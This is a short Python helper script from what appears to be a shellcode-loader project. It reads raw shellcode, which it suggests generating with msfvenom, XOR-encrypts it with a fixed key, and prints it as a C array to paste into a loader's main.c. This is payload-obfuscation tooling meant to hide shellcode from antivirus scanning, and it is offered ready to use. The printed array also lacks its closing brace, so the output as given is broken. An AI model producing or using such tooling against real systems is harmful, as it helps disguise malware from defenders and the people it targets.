import sys

# The same key as in main.c
XOR_KEY = 0x5A

# --- Configuration ---
# Input raw shellcode file (e.g., from msfvenom)
INPUT_FILENAME = 'shellcode.bin'
# Variable name to use in the C code
VARIABLE_NAME = 'encryptedShellcode'
# How many bytes per line in the output
BYTES_PER_LINE = 16
# ---

def main():
    try:
        with open(INPUT_FILENAME, 'rb') as f:
            shellcode = f.read()
    except FileNotFoundError:
        print(f"[!] Error: Input file '{INPUT_FILENAME}' not found.")
        print(f"[i] Please generate it first. Example: msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o {INPUT_FILENAME}")
        sys.exit(1)

    encrypted_shellcode = bytearray()
    for byte in shellcode:
        encrypted_shellcode.append(byte ^ XOR_KEY)

    # --- Print C-style array ---
    c_array = f"unsigned char {VARIABLE_NAME}[] = {{\n    "
    for i, byte in enumerate(encrypted_shellcode):
        if i > 0 and i % BYTES_PER_LINE == 0:
            c_array += "\n    "
        c_array += f"0x{byte:02x}, "
    
    c_array = c_array.strip().strip(',') # Remove trailing comma and whitespace
    c_array += "\n";

    print("[+] Encryption complete!")
    print(f"[i] Shellcode size: {len(shellcode)} bytes")
    print(f"[i] XOR Key: 0x{XOR_KEY:02x}")
    print("\n[*] Copy the following C array into your main.c file:\n")
    print("-" * 50)
    print(c_array)
    print("-" * 50)

if __name__ == '__main__':
    main()
